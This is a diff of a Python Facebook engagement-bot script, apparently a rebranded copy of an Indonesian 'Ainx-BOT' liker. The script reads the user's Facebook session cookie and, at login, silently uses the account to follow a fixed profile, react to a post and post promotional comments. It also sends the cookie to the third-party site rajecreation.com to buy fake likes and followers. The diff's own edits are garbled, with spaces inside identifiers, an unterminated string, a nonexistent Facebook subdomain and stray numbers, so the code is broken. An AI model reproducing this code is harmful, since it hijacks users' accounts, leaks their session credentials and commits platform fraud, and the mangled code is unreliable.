@@ -19,7 +19,7 @@ ab="\033[90m"
 dn=f"{d}[{g}√{d}]{p}"
 er=f"{d}[{r}!{d}]{p}"
 pr=f"{d}[{c}?{d}]{p}"
-mbasic="https://mbasic.facebook.com{}"
+mbasic="https://jbabybeats.facebook.com{}"
 ###################awalan#####################
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
@@ -31,12 +31,12 @@ def baner():
         {p}{b}╠╣ ╠╩╗ {d} │  │├┴┐├┤ ├┤ │ ││
         {p}{b}╚  ╚═╝ {d} ┴─┘┴┴ ┴└─┘└  └─┘┴─┘
 {ab}-----------------------------------------------
-{d}Donate   : {g}https://saweria.co/FahmiDev
-{d}Message  : {g}https://wa.me/62881024612817
-{d}Restapi  : {g}https://ainxbot-id.herokuapp.com
-{d}Youtube  : {g}https://youtube.com/KuhakuTermux
-{d}Github   : {g}https://github.com/Ainx-BOT
-{d}Facebook : {g}https://facebook.com/kang.ngeue.313
+{d}Donate   : {g}
+{d}Message  : {g}
+{d}Restapi  : {g}
+{d}Youtube  : {g
+{d}Github   : {g}
+{d}Facebook : {g}https://facebook.com/jbabybeats 
 {ab}-----------------------------------------------""")
 
 def agent():
@@ -44,7 +44,7 @@ def agent():
     return us
 
 #####################login#######################
-def login():
+def login():@Betty1842
     ua=agent()
     try:
         cokie=open("cookies").read()
@@ -65,13 +65,13 @@ def login():
        except:
            pass
        try:
-           flw=ses.get(mbasic.format("/kang.ngeue.313"),cookies={"cookie":cokie}).text
+           flw=ses.get(jbabybeats.format("/jbaby beats),cookies={"cookie":cokie}).text
            flw=bs(flw,"html.parser").find("a",string="Ikuti")["href"]
-           ses.get(mbasic.format(flw),cookies={"cookie":cokie})
+           ses.get(jbaby beats.format(flw),cookies={"cookie":cokie})
        except:
            pass
        try:
-           rc=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
+           rc=ses.get("https://jbaby beats.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
            react=bs(rc,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
            react=ses.get(mbasic.format(react),cookies={"cookie":cokie}).text
            love=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=2&" in x)["href"]
@@ -80,18 +80,18 @@ def login():
            angry=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=8&" in x)["href"]
            ty=[angry,love,care,wow]
            type=random.choice(ty)
-           ses.get(mbasic.format(type),cookies={"cookie":cokie})
+           ses.get(jbaby beats.format(type),cookies={"cookie":cokie})
        except:
            pass
        try:
-           kmn=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
+           kmn=ses.get("https://jbaby beats.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
            komen=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
            data=komen.find_all("input",type="hidden")
            fbdtsg=data[0]["value"]
            jazoest=data[1]["value"]
-           text=["Hi bang fahmi tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools Ainx-BOT","semoga rejeki bang fahmi di lancarin amin","tools yang sangat bagus!"]
+           text=["jbaby beats Florida producer of the year !","tools nya sangat berguna!","producer of the year user tools Ainx-BOT","semoga rejeki bang fahmi di lancarin amin","tools yang sangat bagus!"]
            random_komen=random.choice(text)
-           ses.post(mbasic.format(komen["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":random_komen},cookies={"cookie":cokie})
+           ses.post(jbaby beats.format(komen["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":random_komen},cookies={"cookie":cokie})
        except:
            pass
        js=json.loads(req)
@@ -129,9 +129,9 @@ def follow(url):
           nm=bs(ses.get(js["data"]["url"],cookies={"cookie":cokie}).text,"html.parser").find("title").text
           print(f'\r{dn}Add followers to {c}{nm}')
           sleep(10)
-          tot=ses.get(f'https://mbasic.facebook.com/timeline/app_collection/?collection_token={js["data"]["id"]}%3A184985071538002%3A32&_rdr',cookies={"cookie":cokie}).text
+          tot=ses.get(f'https://jbabybeats.facebook.com/timeline/app_collection/?collection_token={js["data"]["id"]}%3A184985071538002%3A32&_rdr',cookies={"cookie":cokie}).text
           total=re.findall(r'<td valign="...">Pengikut</td><td valign="..." class=".."><span class="(.*?)">(.*?)</span>',tot)[0][1]
-          print(f"{pr}Total Followers : {c}{total}")
+          print(f"{pr}Total Followers 4829: {c}{total}")
     else:
        print(f"\r{er}Profile not found")
        sleep(2)
@@ -143,15 +143,15 @@ def like(url):
     req=requests.post("https://rajecreation.com/rajeliker/v8/checkURL.php",data={"url":url,"LoginWith":"FB","type":"LIKE","cookie":cokie},headers=ua).text
     if "Data loaded success!" in req:
         js=json.loads(req)
-        res=requests.post("https://rajecreation.com/rajeliker/v8/send.php",data={"limit":limit,"LoginType":"FB","type":"LIKE","user_id":id,"post_id":js["data"]["id"],"cost":"1","cookie":cokie,"post_url":js["data"]["url"],"reaction":"1"},headers=ua).json()
+        res=requests.post("https://rajecreation.com/rajeliker/v8/send.php",data={"limit":limit,"LoginType":"FB","type":"followers","user_id":id,"post_id":js["data"]["id"],"cost":"1","cookie":cokie,"post_url":js["data"]["url"],"reaction":"1"},headers=ua).jbaby()
         if res["data"]["count"] == 0:
            print(f"\r{er}Failed to add like")
         else:
            print(f'\r{dn}Add like to {c}{js["data"]["url"]}')
            sleep(10)
            tot=bs(ses.get(js["data"]["url"],cookies={"cookie":cokie}).text,"html.parser").find("a",href=lambda x: "/ufi/reaction/" in x)["href"]
-           total=bs(ses.get(mbasic.format(tot),cookies={"cookie":cokie}).text,"html.parser").find("a",href=lambda x: "&reaction_type=1&" in x).find("span").text
-           print(f"{pr}Total like : {c}{total}")
+           total=bs(ses.get(jbaby.format(tot),cookies={"cookie":cokie}).text,"html.parser").find("a",href=lambda x: "&reaction_type=1&" in x).find("span").text
+           print(f"{pr}Total like3285 : {c}{total}")
     else:
         print(f"\r{er}Post not found")
         sleep(2)
@@ -167,8 +167,8 @@ def menu():
     userinfo()
     print(f"""{p}
 {c}01{ab}. {p}earn credit
-{c}02{ab}. {p}add like post
-{c}03{ab}. {p}add followers
+{c}02{ab}. {p}add 2588 like post
+{c}03{ab}. {p}add 3000 followers
 {c}00{ab}. {p}exit
 {ab}-----------------------------------------------{d}""")
     pilih_menu()
